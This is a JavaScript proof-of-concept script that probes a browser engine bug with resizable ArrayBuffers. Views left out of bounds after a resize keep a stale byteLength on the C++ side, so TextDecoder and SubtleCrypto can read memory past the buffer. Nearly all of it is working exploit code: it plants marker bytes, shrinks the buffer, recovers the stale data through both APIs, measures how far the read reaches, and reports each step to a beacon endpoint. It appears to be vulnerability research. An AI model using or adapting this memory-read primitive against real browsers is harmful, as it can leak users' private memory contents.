// p160a — ResizableArrayBuffer byteLength inversion probe
//
// Tests CVE: ArrayBufferView.h:120 has inverted OOB condition.
// When a RAB-backed view is OOB (after resize), the C++ byteLength()
// returns the STALE original length instead of 0.
//
// The JS-visible path (JSArrayBufferView::byteLength) is CORRECT.
// But DOM APIs (SubtleCrypto, TextDecoder) go through the C++ path
// via possiblySharedImpl() -> wrappedAs() which skips bounds checks
// for resizable buffers (GenericTypedArrayViewInlines.h:111-116).
//
// Tests:
//   A: RAB availability
//   B: RAB resize within same 64KB page
//   C: JS reports OOB correctly (byteLength === 0)
//   D: TextDecoder reads stale data through C++ path
//   E: SubtleCrypto round-trip stale read
//   F: Measure exact stale byte count
//
// Beacon prefix: V160A-

(function() {
  function BS(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V160A-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }

  BS('BOOT');

  // Test A: RAB feature detection
  var hasRAB = false;
  try {
    var testBuf = new ArrayBuffer(16, { maxByteLength: 64 });
    if (testBuf.resizable === true && testBuf.maxByteLength === 64) {
      hasRAB = true;
      BS('RAB-YES');
    } else {
      BS('RAB-NO-PROPS');
      return;
    }
  } catch (e) {
    BS('RAB-NO-' + e.message.substring(0, 40));
    return;
  }

  // Test B: Create RAB and resize
  // Use 8192 bytes initial, maxByteLength 65536 (1 internal page)
  // Resize to 1 byte — within same page, no mprotect
  var INIT_SIZE = 8192;
  var MAX_SIZE = 65536;
  var PATTERN = 0xAB;

  var rab;
  try {
    rab = new ArrayBuffer(INIT_SIZE, { maxByteLength: MAX_SIZE });
    BS('ALLOC-OK');
  } catch (e) {
    BS('ALLOC-FAIL-' + e.message.substring(0, 30));
    return;
  }

  // Create explicit-length view (NOT auto-length)
  var view = new Uint8Array(rab, 0, INIT_SIZE);

  // Fill with recognizable pattern: 0xAB repeated
  for (var i = 0; i < INIT_SIZE; i++) view[i] = PATTERN;
  // Write marker at known offsets
  view[0] = 0xDE;
  view[1] = 0xAD;
  view[INIT_SIZE - 2] = 0xBE;
  view[INIT_SIZE - 1] = 0xEF;

  // Resize down
  try {
    rab.resize(1);
    BS('RESIZE-OK-' + rab.byteLength);
  } catch (e) {
    BS('RESIZE-FAIL-' + e.message.substring(0, 30));
    return;
  }

  // Test C: JS-visible byteLength should be 0 (view is OOB)
  var jsLen = view.byteLength;
  BS('JSLEN-' + jsLen);

  // Test D: TextDecoder — uses C++ ArrayBufferView::byteLength
  var tdAvail = typeof TextDecoder !== 'undefined';
  BS('TD-' + (tdAvail ? 'YES' : 'NO'));

  if (tdAvail) {
    try {
      var dec = new TextDecoder('utf-8', { fatal: false });
      var text = dec.decode(view);
      var tdLen = text.length;
      BS('TDLEN-' + tdLen);
      if (tdLen > 1) {
        // Stale read confirmed! Check first bytes match pattern
        var b0 = text.charCodeAt(0);
        var b1 = text.charCodeAt(1);
        BS('TDBYTES-' + b0.toString(16) + '-' + b1.toString(16));
        if (tdLen >= INIT_SIZE) {
          BS('TD-STALE-FULL-' + tdLen);
        } else if (tdLen > 10) {
          BS('TD-STALE-PARTIAL-' + tdLen);
        }
      } else {
        BS('TD-CLEAN-' + tdLen);
      }
    } catch (e) {
      BS('TD-ERR-' + e.message.substring(0, 30));
    }
  }

  // Test E: SubtleCrypto round-trip
  var scAvail = typeof crypto !== 'undefined' && crypto.subtle;
  BS('SC-' + (scAvail ? 'YES' : 'NO'));

  if (scAvail) {
    (async function() {
      try {
        var key = await crypto.subtle.generateKey(
          { name: 'AES-CTR', length: 128 }, true, ['encrypt', 'decrypt']
        );
        BS('SC-KEY-OK');

        var iv = new Uint8Array(16);

        // Encrypt the OOB view
        var ct = await crypto.subtle.encrypt(
          { name: 'AES-CTR', counter: iv, length: 128 }, key, view
        );
        BS('SC-CT-' + ct.byteLength);

        if (ct.byteLength > 1) {
          // Decrypt to recover stale data
          var pt = await crypto.subtle.decrypt(
            { name: 'AES-CTR', counter: iv, length: 128 }, key, ct
          );
          var recovered = new Uint8Array(pt);
          BS('SC-PT-' + recovered.length);

          // Verify pattern
          var b0 = recovered[0];
          var b1 = recovered[1];
          var bEnd0 = recovered.length >= INIT_SIZE ? recovered[INIT_SIZE - 2] : 0;
          var bEnd1 = recovered.length >= INIT_SIZE ? recovered[INIT_SIZE - 1] : 0;
          BS('SC-HEAD-' + b0.toString(16) + b1.toString(16));
          BS('SC-TAIL-' + bEnd0.toString(16) + bEnd1.toString(16));

          if (recovered.length >= INIT_SIZE && b0 === 0xDE && b1 === 0xAD) {
            BS('SC-STALE-CONFIRMED-' + recovered.length);
            if (bEnd0 === 0xBE && bEnd1 === 0xEF) {
              BS('SC-STALE-FULL-MATCH');
            }
          } else if (recovered.length > 1) {
            BS('SC-STALE-PARTIAL-' + recovered.length);
          } else {
            BS('SC-CLEAN');
          }
        } else {
          BS('SC-CLEAN-' + ct.byteLength);
        }
      } catch (e) {
        BS('SC-ERR-' + e.message.substring(0, 40));
      }

      // Test F: Measure stale reach — try larger sizes
      try {
        var rab2 = new ArrayBuffer(60000, { maxByteLength: 65536 });
        var view2 = new Uint8Array(rab2, 0, 60000);
        for (var j = 0; j < 60000; j++) view2[j] = 0xCC;
        rab2.resize(1);

        var dec2 = new TextDecoder('utf-8', { fatal: false });
        var text2 = dec2.decode(view2);
        BS('F-MAXSTALE-' + text2.length);
      } catch (e) {
        BS('F-ERR-' + e.message.substring(0, 30));
      }

      BS('DONE');
    })();
  } else {
    // No SubtleCrypto — TextDecoder result is our answer
    BS('DONE-NO-SC');
  }
})();
